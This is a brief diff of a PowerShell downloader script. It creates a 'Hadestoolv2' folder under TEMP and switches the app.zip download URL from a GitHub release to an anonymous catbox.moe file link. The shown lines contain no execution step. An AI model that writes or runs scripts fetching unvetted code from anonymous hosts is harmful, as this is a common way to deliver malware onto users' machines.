@@ -1,7 +1,7 @@
 $folder = "$env:TEMP\Hadestoolv2"
 if (!(Test-Path $folder)) { New-Item -ItemType Directory -Path $folder | Out-Null }
 
-$zipUrl = "https://github.com/natchanam18-debug/SSS/releases/download/v1.0.2/app.zip"
+$zipUrl = "https://files.catbox.moe/zvd84i.zip"
 $zipPath = "$env:TEMP\app.zip"
 
 Write-Host "กำลังดาวน์โหลดโปรแกรม..." -ForegroundColor Cyan
